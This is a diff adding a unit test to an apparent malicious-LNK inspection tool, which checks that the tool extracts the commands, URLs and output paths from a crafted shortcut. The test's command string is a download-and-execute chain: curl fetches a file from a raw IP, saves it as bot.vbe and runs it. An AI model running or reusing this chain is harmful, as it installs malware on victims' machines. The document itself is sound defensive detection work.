@@ -69,8 +69,30 @@ class AptC60DeliveryTests(unittest.TestCase):
         self.assertEqual(report["embedded_script_count"], 1)
         self.assertIn("mshta", report["actions"])
         self.assertTrue(report["urls"])
+        self.assertTrue(report["commands"])
         args = build_parser().parse_args(["--input", "x.lnk"])
         self.assertEqual(args.kind, "auto")
+
+    def test_generic_curl_vbe_chain_is_extracted(self) -> None:
+        command = (
+            r"%windir%\SysWOW64\cmd.exe /c explorer http://103.77.242.187/data.pdf "
+            r"& curl http://103.77.242.187/logo.png -o %APPDATA%\bot.vbe "
+            r"& %APPDATA%\bot.vbe"
+        )
+        header = (
+            b"L\x00\x00\x00"
+            + bytes.fromhex("0114020000000000c000000000000046")
+            + b"\x00" * 56
+        )
+        report = inspect_lnk(header + command.encode("utf-16le"))
+        self.assertTrue(report["is_shell_link"])
+        self.assertIn("cmd.exe", report["actions"])
+        self.assertIn("curl", report["actions"])
+        self.assertIn("explorer", report["actions"])
+        self.assertIn(".vbe", report["actions"])
+        self.assertIn("http://103.77.242.187/logo.png", report["urls"])
+        self.assertIn(r"%APPDATA%\bot.vbe", report["output_paths"])
+        self.assertTrue(report["commands"])
 
 
 if __name__ == "__main__":
